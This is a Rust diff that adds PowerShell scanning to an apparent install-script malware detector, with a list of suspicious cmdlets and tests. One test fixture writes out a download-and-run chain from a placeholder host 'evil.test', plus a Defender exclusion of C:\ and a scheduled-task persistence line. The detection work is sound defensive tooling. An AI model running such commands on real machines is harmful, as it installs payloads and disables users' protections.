@@ -24,6 +24,9 @@ pub enum Lang {
     Perl,
     /// Shell (sh/bash/zsh) - covers OS-package install hooks.
     Shell,
+    /// PowerShell (`ps1`/`psm1`) - Chocolatey packages ARE PowerShell scripts,
+    /// and Windows install hooks live here.
+    PowerShell,
     Lua,
 }
 
@@ -40,6 +43,7 @@ impl Lang {
         Lang::Cpp,
         Lang::Perl,
         Lang::Shell,
+        Lang::PowerShell,
         Lang::Lua,
     ];
 
@@ -55,6 +59,7 @@ impl Lang {
             Lang::Cpp => &["c", "h", "cpp", "cc", "cxx", "hpp", "hh", "hxx"],
             Lang::Perl => &["pl", "pm", "t"],
             Lang::Shell => &["sh", "bash", "zsh", "ksh"],
+            Lang::PowerShell => &["ps1", "psm1", "psd1"],
             Lang::Lua => &["lua"],
         }
     }
@@ -186,6 +191,36 @@ impl Lang {
             ],
             // Shell - the install-hook surface: fetch-and-run, decode, escalate,
             // persist. High-value for OS-package maintainer scripts / scriptlets.
+            // The surface a Chocolatey/winget install script actually uses.
+            // Aliases (`iex`, `iwr`, `irm`) carry their trailing space so they
+            // cannot hit inside a base64 blob or a longer identifier.
+            Lang::PowerShell => &[
+                "Invoke-Expression",
+                "iex ",
+                "Invoke-WebRequest",
+                "iwr ",
+                "Invoke-RestMethod",
+                "irm ",
+                "Net.WebClient",
+                "DownloadString",
+                "DownloadFile",
+                "Start-Process",
+                "Start-BitsTransfer",
+                "System.Net.Sockets",
+                "-EncodedCommand",
+                "FromBase64String",
+                // Turning the machine's own defences down.
+                "Set-ExecutionPolicy",
+                "Add-MpPreference",
+                "Set-MpPreference",
+                // Persistence and privilege.
+                "Register-ScheduledTask",
+                "schtasks",
+                "New-Service",
+                "New-ItemProperty",
+                "Get-Credential",
+                "ConvertTo-SecureString",
+            ],
             Lang::Shell => &[
                 "curl ",
                 "wget ",
@@ -278,6 +313,43 @@ mod tests {
         let detail = &f[0].detail;
         assert!(detail.contains("system("), "{detail}");
         assert!(detail.contains("dlopen("), "{detail}");
+    }
+
+    /// A Chocolatey package IS a PowerShell script, so `.ps1` has to be a
+    /// scanned extension — before this it was not, and every choco install
+    /// script came back clean because nothing ever opened it.
+    #[test]
+    fn flags_powershell_install_script_primitives() {
+        let f = scan_one(
+            "chocolateyInstall.ps1",
+            "$u='http://evil.test/x.exe'\n\
+             (New-Object Net.WebClient).DownloadFile($u,'x.exe')\n\
+             Start-Process 'x.exe'\n\
+             Add-MpPreference -ExclusionPath 'C:\\'\n\
+             Register-ScheduledTask -TaskName boot\n",
+            Lang::PowerShell,
+        );
+        assert!(!f.is_empty(), "a .ps1 must be scanned at all");
+        let d = &f[0].detail;
+        assert!(d.contains("Net.WebClient"), "{d}");
+        assert!(d.contains("Start-Process"), "{d}");
+        assert!(d.contains("Add-MpPreference"), "{d}");
+        assert!(d.contains("Register-ScheduledTask"), "{d}");
+    }
+
+    /// The short aliases carry a trailing space so they cannot match inside a
+    /// base64 blob or a longer word.
+    #[test]
+    fn powershell_aliases_do_not_match_inside_words() {
+        let clean = scan_one(
+            "quiet.ps1",
+            "$wireless = 'iwrx'\n$prefix = 'irmware'\nWrite-Output $wireless\n",
+            Lang::PowerShell,
+        );
+        assert!(clean.is_empty(), "got {clean:?}");
+
+        let real = scan_one("real.ps1", "iwr https://x.test/a.ps1\n", Lang::PowerShell);
+        assert!(!real.is_empty());
     }
 
     #[test]
